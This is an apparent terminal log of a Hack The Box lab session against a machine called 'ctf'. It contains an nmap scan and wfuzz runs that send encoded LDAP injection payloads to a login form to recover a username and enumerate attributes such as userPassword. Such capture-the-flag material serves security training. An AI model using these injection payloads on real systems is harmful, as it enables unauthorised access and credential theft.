@@ -1,0 +1,134 @@
+root@parrot:~/hackthebox/ctf# mkdir nmap                                        
+root@parrot:~/hackthebox/ctf# nmap -sC -sV -oA nmap/ctf 10.10.10.122            
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-15 07:26 EST                 
+Nmap scan report for 10.10.10.122       
+Host is up (1.6s latency).              
+Not shown: 998 filtered ports           
+PORT   STATE SERVICE VERSION            
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)                                 
+| ssh-hostkey:                          
+|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)                  
+|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)                 
+|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)               
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)                                                                
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16                                                                       
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                   
+Nmap done: 1 IP address (1 host up) scanned in 177.51 seconds                   
+root@parrot:~/hackthebox/ctf# find /opt/SecLists/ | grep char                   
+/opt/SecLists/Fuzzing/char.txt          
+/opt/SecLists/Fuzzing/special-chars.txt 
+/opt/SecLists/Fuzzing/User-Agents/software-name/charlotte.txt                   
+/opt/SecLists/Fuzzing/Metacharacters.fuzzdb.txt                                 
+root@parrot:~/hackthebox/ctf# cp /opt/SecLists/Fuzzing/char.txt.                
+cp: missing destination file operand after '/opt/SecLists/Fuzzing/char.txt.'    
+Try 'cp --help' for more information.   
+root@parrot:~/hackthebox/ctf# cp /opt/SecLists/Fuzzing/char.txt .               
+root@parrot:~/hackthebox/ctf# ls        
+char.txt  nmap                          
+root@parrot:~/hackthebox/ctf# wfuzz --hw 233  'inputUsername=FUZZ%252a&inputOTP=1234' -w char.txt http://10.10.10.122/login.php                                  
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.        
+
+********************************************************                        
+* Wfuzz 2.4 - The Web Fuzzer                           *                        
+*                                                      *                        
+* Version up to 1.4c coded by:                         *                        
+* Christian Martorella (cmartorella@edge-security.com) *                        
+* Carlos del ojo (deepbit@gmail.com)                   *                        
+*                                                      *                        
+* Version 1.4d to 2.4 coded by:                        *                        
+* Xavier Mendez (xmendez@edge-security.com)            *                        
+********************************************************                        
+
+Usage:  wfuzz [options] -z payload,params <url>                                 
+
+        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.                                      
+        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.          
+
+
+Examples:                               
+        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z                                                    
+        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}                                                                            
+        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ                                                                                 
+
+Type wfuzz -h for further information or --help for advanced usage.             
+
+Fatal exception: Too many arguments.    
+root@parrot:~/hackthebox/ctf# wfuzz --hw 233  -d 'inputUsername=FUZZ%252a&inputOTP=1234' -w char.txt http://10.10.10.122/login.php                               
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.        
+
+********************************************************                        
+* Wfuzz 2.4 - The Web Fuzzer                           *                        
+********************************************************                        
+
+Target: http://10.10.10.122/login.php   
+Total requests: 26                      
+
+===================================================================             
+ID           Response   Lines    Word     Chars       Payload                                                                                                    
+===================================================================             
+
+000000012:   200        68 L     231 W    2822 Ch     "l"                                                                                                        
+
+Total time: 9.176974                    
+Processed Requests: 26                  
+Filtered Requests: 25                   
+Requests/sec.: 2.833177                 
+
+root@parrot:~/hackthebox/ctf# wfuzz --hw 233  -d 'inputUsername=ldapuseFUZZ%252a&inputOTP=1234' -w char.txt http://10.10.10.122/login.php                        
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.        
+
+********************************************************                        
+* Wfuzz 2.4 - The Web Fuzzer                           *                        
+********************************************************                        
+
+Target: http://10.10.10.122/login.php   
+Total requests: 26                      
+
+===================================================================             
+ID           Response   Lines    Word     Chars       Payload                                                                                                    
+===================================================================             
+
+000000018:   200        68 L     231 W    2822 Ch     "r"                                                                                                        
+
+Total time: 7.828196                    
+Processed Requests: 26                  
+Filtered Requests: 25                   
+Requests/sec.: 3.321326                 
+
+root@parrot:~/hackthebox/ctf# wfuzz --hw 233  -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w attrib.txt http://10.10.10.122/login.php      
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.        
+
+********************************************************                        
+* Wfuzz 2.4 - The Web Fuzzer                           *                        
+********************************************************                        
+
+Target: http://10.10.10.122/login.php   
+Total requests: 27                      
+
+===================================================================             
+ID           Response   Lines    Word     Chars       Payload                                                                                                    
+===================================================================             
+
+000000002:   200        68 L     231 W    2822 Ch     "cn"                                                                                                       
+000000004:   200        68 L     231 W    2822 Ch     "commonName"                                                                                               
+000000017:   200        68 L     231 W    2822 Ch     "objectClass"                                                                                              
+000000015:   200        68 L     231 W    2822 Ch     "name"                                                                                                     
+000000020:   200        68 L     231 W    2822 Ch     "pager"                                                                                                    
+000000022:   200        68 L     231 W    2822 Ch     "sn"                                                                                                       
+000000013:   200        68 L     231 W    2822 Ch     "mail"                                                                                                     
+000000024:   200        68 L     231 W    2822 Ch     "surname"                                                                                                  
+000000025:   200        68 L     231 W    2822 Ch     "uid"                                                                                                      
+000000027:   200        68 L     231 W    2822 Ch     "userPassword"                                                                                             
+
+Total time: 7.793883                    
+Processed Requests: 27                  
+Filtered Requests: 17                   
+Requests/sec.: 3.464255                 
+
+root@parrot:~/hackthebox/ctf# timedatectl set-time 19:57:00                     
+root@parrot:~/hackthebox/ctf#           
